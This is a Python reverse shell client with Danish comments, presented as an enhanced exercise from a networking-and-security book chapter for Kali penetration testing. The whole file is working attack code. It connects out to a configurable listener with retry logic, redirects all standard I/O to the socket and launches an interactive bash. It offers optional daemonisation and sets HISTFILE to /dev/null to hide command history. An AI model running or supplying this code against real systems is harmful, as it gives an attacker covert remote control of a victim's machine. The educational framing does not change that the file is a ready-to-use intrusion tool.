#!/usr/bin/env python3
"""
Reverse Shell Client - FORBEDRET VERSION
Baseret på Kapitel 3: Socket Programming
Fra: Mastering Python for Networking and Security (2nd Edition)

Dette script demonstrerer socket programmering og proces-daemonisering.
Til brug i Kali Linux til penetrationstest og sikkerhedsanalyse.
"""
import socket
import subprocess
import os
import sys
import logging
from time import sleep

# ============================================================================
# CONFIGURATION
# ============================================================================
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 45679
RETRY_ATTEMPTS = 5
RETRY_DELAY = 3
SHELL_PATH = "/bin/bash"

# ============================================================================
# LOGGING SETUP
# ============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/reverse_shell.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


# ============================================================================
# DAEMON FUNCTIONS
# ============================================================================
def daemonize():
    """
    Implements double-fork method to create daemon process.
    
    Process:
    1. First fork() - creates child process and exits parent
    2. setsid() - creates new session and becomes session leader
    3. Second fork() - ensures process cannot acquire controlling terminal
    4. chdir('/') - avoid keeping directories mounted
    5. umask(0) - reset file creation mask
    """
    try:
        pid = os.fork()
        if pid > 0:
            logger.info(f'First fork successful, child PID: {pid}')
            sys.exit(0)
    except OSError as e:
        logger.error(f'First fork failed: {e}')
        sys.exit(1)

    os.chdir('/')
    os.setsid()
    os.umask(0)

    try:
        pid = os.fork()
        if pid > 0:
            logger.info(f'Second fork successful, child PID: {pid}')
            sys.exit(0)
    except OSError as e:
        logger.error(f'Second fork failed: {e}')
        sys.exit(1)

    sys.stdout.flush()
    sys.stderr.flush()
    
    logger.info(f'Daemon process started with PID: {os.getpid()}')


# ============================================================================
# SOCKET FUNCTIONS
# ============================================================================
def create_socket_connection(host, port, retries=RETRY_ATTEMPTS):
    """
    Create TCP socket connection with automatic retry logic.
    
    Args:
        host: Target host IP or hostname
        port: Target port number
        retries: Number of retry attempts on failure
    
    Returns:
        socket object or None on failure
    """
    for attempt in range(1, retries + 1):
        try:
            logger.info(f'Connection attempt {attempt}/{retries} to {host}:{port}')
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            sock.settimeout(10)
            sock.connect((host, port))
            sock.settimeout(None)
            
            logger.info(f'✓ Connected to {host}:{port}')
            return sock
            
        except socket.timeout:
            logger.warning(f'✗ Connection attempt {attempt} timeout')
        except socket.error as e:
            logger.warning(f'✗ Connection attempt {attempt} failed: {e}')
        except Exception as e:
            logger.error(f'✗ Unexpected error: {e}')
        
        if attempt < retries:
            logger.info(f'Waiting {RETRY_DELAY} seconds before retry...')
            sleep(RETRY_DELAY)
    
    logger.error('All connection attempts failed')
    return None


def redirect_io_to_socket(sock):
    """
    Redirect stdin, stdout and stderr to socket.
    
    File Descriptors:
        0 = stdin  (standard input)
        1 = stdout (standard output)
        2 = stderr (standard error)
    """
    try:
        fd = sock.fileno()
        
        os.dup2(fd, 0)
        os.dup2(fd, 1)
        os.dup2(fd, 2)
        
        logger.info('I/O redirected to socket')
        
    except OSError as e:
        logger.error(f'I/O redirection failed: {e}')
        raise


def execute_interactive_shell(shell=SHELL_PATH):
    """
    Start interactive shell over socket connection.
    
    Args:
        shell: Path to shell program (default: /bin/bash)
    """
    try:
        logger.info(f'Starting interactive shell: {shell}')
        
        os.environ['HISTFILE'] = '/dev/null'
        os.environ['TERM'] = 'xterm'
        
        subprocess.call([shell, "-i"])
        
    except FileNotFoundError:
        logger.error(f'Shell not found: {shell}')
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        logger.error(f'Shell execution failed: {e}')


# ============================================================================
# MAIN PROGRAM
# ============================================================================
def main():
    """
    Main function orchestrating reverse shell connection.
    
    Flow:
    1. (Optional) Daemonize process
    2. Create socket connection
    3. Redirect I/O
    4. Start interactive shell
    5. Cleanup on exit
    """
    logger.info('=' * 70)
    logger.info('Reverse Shell Client - Kali Linux Edition')
    logger.info('Chapter 3: Socket Programming')
    logger.info('=' * 70)
    
    # Uncomment to run as daemon
    # daemonize()
    
    sock = create_socket_connection(TARGET_HOST, TARGET_PORT)
    
    if not sock:
        logger.error('Could not establish connection. Exiting.')
        sys.exit(1)
    
    try:
        redirect_io_to_socket(sock)
        execute_interactive_shell()
        
    except KeyboardInterrupt:
        logger.info('Interrupted by user (Ctrl+C)')
    except Exception as e:
        logger.error(f'Runtime error: {e}', exc_info=True)
    finally:
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
            logger.info('Socket closed properly')
        except:
            pass
        
        logger.info('Reverse shell terminated')


if __name__ == "__main__":
    if os.geteuid() == 0:
        logger.warning('⚠️  Running as root - be careful!')
    
    main()
